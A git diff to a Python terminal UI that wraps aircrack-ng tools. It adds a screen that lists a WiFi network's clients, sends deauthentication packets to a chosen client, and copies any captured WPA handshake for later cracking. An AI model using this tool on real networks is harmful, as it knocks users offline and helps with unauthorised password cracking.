@@ -3,15 +3,19 @@
 import functools
 import operator
 import os
+import shutil
 import traceback
 import typing as t
 
 import urwid
 
+from aircrack.aireplay import Aireplay
 from aircrack.airmon import Airmon
 from aircrack.airodump import Airodump
-from aircrack.models import WifiAdapter, AccessPoint
-from urwid_components import OkCancelDialog, StyledButton, SimpleButton
+from aircrack.cowpatty import Cowpatty
+from aircrack.models import WifiAdapter, AccessPoint, Station
+
+from urwid_components import SimpleButton, OkDialog
 
 PALETTE = [
     ('banner', 'dark red', ''),
@@ -53,6 +57,7 @@ class SelectableListView(urwid.WidgetWrap):
             self,
             loop: urwid.MainLoop,
             elements: t.Iterable[t.Any],
+            title: str,
             columns: t.Iterable[str],
             fields: t.Iterable[str],
             sort_by: t.Optional[str] = None,
@@ -60,6 +65,7 @@ class SelectableListView(urwid.WidgetWrap):
         self.loop = loop
 
         self.elements = list(elements)
+        self.title = title
         self.columns = list(columns)
         self.fields = list(fields)
         self.sort_by = sort_by
@@ -67,9 +73,10 @@ class SelectableListView(urwid.WidgetWrap):
         self.elements_list_widget = urwid.ListBox(urwid.SimpleFocusListWalker([]))
         self.update_list_widget()
 
+        header = urwid.Pile([LOGO, urwid.Text(f'-=-=- {self.title} -=-=-', align=urwid.CENTER), urwid.Divider()])
         main = urwid.LineBox(
             urwid.Padding(
-                urwid.Frame(header=LOGO, body=self.elements_list_widget),
+                urwid.Frame(header=header, body=self.elements_list_widget),
                 left=1,
                 right=1,
             )
@@ -95,13 +102,13 @@ class SelectableListView(urwid.WidgetWrap):
                 on_press=functools.partial(self.select_element, element),
             )
             for element in (
-                sorted(self.elements, key=operator.attrgetter(self.sort_by))
+                sorted(self.elements, key=operator.attrgetter(self.sort_by), reverse=True)
                 if self.sort_by else self.elements
             )
         ])
 
         if self.elements:
-            focus = focus and min(focus, len(self.elements) - 1) or 1
+            focus = focus and min(focus, len(self.elements)) or 1
             self.elements_list_widget.set_focus(focus)
 
     def select_element(self, element: t.Any, button):
@@ -110,14 +117,51 @@ class SelectableListView(urwid.WidgetWrap):
 
 class NetworkScreen(SelectableListView):
     def __init__(self, loop: urwid.MainLoop, adapter: WifiAdapter, network: AccessPoint):
+        self.adapter = adapter
         self.network = network
         self.airodump = Airodump(adapter.interface, access_point=self.network)
+        self.captured_handshake = ''
 
-        super().__init__(loop, network.stations, )
+        super().__init__(
+            loop,
+            elements=[],
+            title=f'{self.network.essid}[{self.network.bssid}]: available targets',
+            columns=['BSSID', 'MAC', 'Power', 'Packets'],
+            fields=['bssid', 'station_mac', 'power', 'packets'],
+            sort_by='power',
+        )
+        self.loop.set_alarm_in(1, self.fetch_network, None)
 
-    def fetch_network(self):
-        self.network = self.airodump.fetch()
-        self.elements = self.network.stations
+    def fetch_network(self, *args):
+        try:
+            self.network = self.airodump.fetch()[0]
+            self.elements = self.network.stations
+            self.update_list_widget()
+        except ValueError:
+            pass
+        self.loop.set_alarm_in(1, self.fetch_network, None)
+
+        cap_file = self.airodump.get_latest_file('.cap')
+        if cap_file != self.captured_handshake and Cowpatty.contains_valid_handshake(cap_file):
+            self.captured_handshake = cap_file
+            path = f'{self.network.essid}-{self.network.bssid}.cap'
+            shutil.copyfile(cap_file, path)
+            self.loop.widget = OkDialog(
+                self, self.loop, f'Captured WPA handshake under {path}', title='Success'
+            )
+        self.loop.draw_screen()
+
+    def select_element(self, element: Station, button):
+        count = 5
+        Aireplay.send_deauth(wifi_adapter=self.adapter, station=element, count=count)
+        self.loop.widget = OkDialog(
+            self, self.loop, f'Sent {count} deauth packets for MAC:[{element.station_mac}]', title='Aireplay'
+        )
+
+    def keypress(self, size, key: str):
+        if key == 'esc':
+            self.loop.widget = NetworkListScreen(self.loop, self.adapter)
+        super().keypress(size, key)
 
 
 class NetworkListScreen(SelectableListView):
@@ -131,6 +175,7 @@ class NetworkListScreen(SelectableListView):
         super().__init__(
             loop,
             elements=[],
+            title='Available Networks',
             columns=['BSSID', 'ESSID', 'Channel', 'Stations', 'Power', 'Privacy', 'Cipher', 'Authentication'],
             fields=['bssid', 'essid', 'channel', 'num_stations', 'power', 'privacy', 'cipher', 'authentication'],
             sort_by='power',
@@ -138,6 +183,8 @@ class NetworkListScreen(SelectableListView):
         self.loop.set_alarm_in(1, self.fetch_networks, None)
 
     def fetch_networks(self, *args):
+        if not hasattr(self, 'airodump'):
+            return
         try:
             self.elements = self.airodump.fetch()
             self.update_list_widget()
@@ -146,13 +193,20 @@ class NetworkListScreen(SelectableListView):
         self.loop.set_alarm_in(1, self.fetch_networks, None)
 
     def select_element(self, element: AccessPoint, button):
+        del self.airodump
         self.loop.widget = NetworkScreen(self.loop, self.adapter, element)
 
 
 class WifiAdapterScreen(SelectableListView):
     def __init__(self, loop: urwid.MainLoop, adapters: t.Iterable[WifiAdapter]):
         columns = ['PHY', 'Interface', 'Driver', 'Chipset']
-        super().__init__(loop, list(adapters), columns=columns, fields=[c.lower() for c in columns])
+        super().__init__(
+            loop,
+            elements=list(adapters),
+            title='Select WiFi adapter',
+            columns=columns,
+            fields=[c.lower() for c in columns],
+        )
 
     def select_element(self, element: WifiAdapter, button):
         self.loop.widget = NetworkListScreen(self.loop, adapter=element)
@@ -185,3 +239,7 @@ if __name__ == "__main__":
         pass
     except Exception as e:
         traceback.print_exc()
+
+    for adapter in Airmon.get_wifi_adapters():
+        if adapter.monitoring_enabled:
+            Airmon.stop_monitoring(adapter)
